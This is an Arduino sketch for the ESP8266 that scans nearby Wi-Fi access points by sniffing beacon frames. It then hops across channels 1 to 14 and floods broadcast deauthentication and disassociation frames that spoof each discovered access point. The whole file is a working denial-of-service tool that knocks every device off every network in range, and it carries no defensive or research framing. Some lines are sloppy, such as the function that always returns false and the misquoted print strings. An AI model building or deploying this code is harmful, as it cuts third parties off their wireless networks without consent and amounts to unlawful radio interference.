
// since newer esp8266 sdk does not support "dirty packet injection anymore"
// use the 2.0.0 sdk from arduino board manager
// BoardManager repo: http://arduino.esp8266.com/stable/package_esp8266com_index.json
// http://esp8266.github.io/Arduino/versions/2.0.0/doc/installing.html


#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>

#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 50

// Channel to perform deauth
uint8_t channel = 0;

// Packet buffer
uint8_t packet_buffer[64];

// DeAuth template
uint8_t template_da[26] =
    {
        /*  0 - 1  */ 0xC0,
                      0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };
//{0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
/*
  bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings.getDeauthReason(), accesspoints.getCh(num));
  }
*/
uint8_t broadcast2[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

struct beaconinfo {
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};

beaconinfo aps_known[MAX_APS_TRACKED];                    // Array to save MACs of known APs
int aps_known_count = 0;                                  // Number of known APs
int nothing_new = 0;

struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi) {
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}

int register_beacon(beaconinfo beacon) {
  int known = 0;   // Clear known flag
  for (int u = 0; u < aps_known_count; u++) {
    if (!memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
      known = 1;
      break;
    }   // AP known => Set known flag
  }
  if (!known)  // AP is NEW, copy MAC to array and return it
  {
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;

    if ((unsigned int) aps_known_count >=
        sizeof(aps_known) / sizeof(aps_known[0])) {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}

void print_beacon(beaconinfo beacon) {
  if (beacon.err != 0) {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } else {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

/* ==============================================
   Promiscous callback structures, see ESP manual
   ============================================== */

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};

/* Creates a packet.
   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;
   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq) {
  int i = 0;

  memcpy(buf, template_da, 26);
  // Destination
  memcpy(buf + 4, c, ETH_MAC_LEN);
  // Sender
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  // BSS
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  // Seq_n
  //  buf[22] = seq % 0xFF;
  //  buf[23] = seq / 0xFF;

  return 26;
}

/* Sends deauth packets. */
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq) {
  uint8_t i = 0;
  uint16_t sz = 0; //0x10
  for (i = 0; i < 2; i++) {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
    packet_buffer[0] = 0xa0;
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
  }
}

void promisc_cb(uint8_t *buf, uint16_t len) {
  int i = 0;
  uint16_t seq_n_new = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl *) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2 *) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (register_beacon(beacon) == 0) {
      print_beacon(beacon);
      nothing_new = 0;
    }
  }
}
/*
 espcomm_send_command: cant receive slip payload data
 https://github.com/esp8266/Arduino/issues/2801
 */

uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

uint8_t tmpPacketRate;
int16_t packetSize = 0;

bool sendPacket(uint8_t *packet, uint8_t packetSize, uint8_t ch, uint16_t tries) {
  wifi_set_channel(ch);
  bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
  for (int i = 0; i < tries && !sent; i++)sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
  Serial.printf("sendPacket: sent = %d\n",sent);
  return sent;
}

bool deauthDevice(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch) {
  bool success = false;
  //packetSize = sizeof(deauthPacket);
  //memcpy(&deauthPacket[4], stMac, 6);
  memcpy(&deauthPacket[10], apMac, 6);
  memcpy(&deauthPacket[16], apMac, 6);
  //deauthPacket[24] = reason;
  for(int i=0;i<0x10;i++){
    deauthPacket[0] = 0xC0;
//  if (sendPacket(deauthPacket,26, ch, 5)) {
//    success = true;
//  }
 wifi_send_pkt_freedom(deauthPacket, 26, 0);
  Serial.printf("%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",deauthPacket[0],deauthPacket[1],deauthPacket[2],deauthPacket[3],deauthPacket[4],deauthPacket[5],deauthPacket[6],deauthPacket[7],deauthPacket[8],deauthPacket[9],deauthPacket[10],deauthPacket[11],deauthPacket[12],deauthPacket[13],deauthPacket[14],deauthPacket[15],deauthPacket[16],deauthPacket[17],deauthPacket[18],deauthPacket[19],deauthPacket[20],deauthPacket[21],deauthPacket[22],deauthPacket[23],deauthPacket[24],deauthPacket[25]);


  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
  }
//  if (sendPacket(deauthPacket,26, ch, 5)) {
//    success = true;
//  }
  return success;
}


void setup() {
  Serial.begin(115200);
  Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());

  // Promiscuous works only with station mode
  if (wifi_set_opmode(STATION_MODE)) {
    Serial.println('Success: wifi_set_opmode(STATION_MODE)');
  } else {
    Serial.println('Failed: wifi_set_opmode(STATION_MODE)');
  }

  // Set up promiscuous callback
  wifi_set_channel(1);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
}

void loop() {
  while (true) {

    channel = 1;
    wifi_set_channel(channel);
    while (true) {
      nothing_new++;
      if (nothing_new > 50) {
        nothing_new = 0;

        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(0);
        wifi_promiscuous_enable(1);
        for (int ua = 0; ua < aps_known_count; ua++) {
          if (aps_known[ua].channel == channel) {

            Serial.printf("BEACON: [%32s]\n", aps_known[ua].ssid);
          bool result=  deauthDevice(aps_known[ua].bssid, broadcast, 1, channel);
            Serial.printf("send packet: %d\n",result);
            //deauth(broadcast2, aps_known[ua].bssid, 128);
          }
        }
        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(promisc_cb);
        wifi_promiscuous_enable(1);

        channel++;
        if (channel == 15) break;
        wifi_set_channel(channel);
      }
      delay(1);

      if ((Serial.available() > 0) && (Serial.read() == '\n')) {
        Serial.println(
            "\n-------------------------------------------------------------------------\n");
        for (int u = 0; u < aps_known_count; u++) print_beacon(aps_known[u]);

        Serial.println(
            "\n-------------------------------------------------------------------------\n");
      }
    }
  }
}